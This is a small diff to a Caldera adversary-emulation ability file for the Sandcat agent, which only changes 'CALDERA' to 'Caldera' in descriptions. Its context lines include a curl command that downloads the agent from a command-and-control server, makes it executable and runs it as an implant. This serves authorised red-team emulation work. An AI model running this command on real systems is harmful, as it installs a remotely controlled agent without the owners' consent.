@@ -2,7 +2,7 @@
 
 - id: 2f34977d-9558-4c12-abad-349716777c6b
   name: Sandcat
-  description: CALDERA's default agent, written in GoLang. Communicates through the HTTP(S) contact by default.
+  description: Caldera's default agent, written in GoLang. Communicates through the HTTP(S) contact by default.
   tactic: command-and-control
   technique:
     attack_id: T1105
@@ -49,7 +49,7 @@
               curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:amd64" -H "gocat-extensions:proxy_http" -H "includeProxyPeers:HTTP" $server/file/download > #{agents.implant_name};
               chmod +x #{agents.implant_name};
               ./#{agents.implant_name} -server $server -listenP2P -v
-          - description: (ARM64) CALDERA's default agent, written in GoLang. Communicates through the HTTP(S) contact by default.
+          - description: (ARM64) Caldera's default agent, written in GoLang. Communicates through the HTTP(S) contact by default.
             architecture: ARM64
             command: |
               server="#{app.contact.http}";
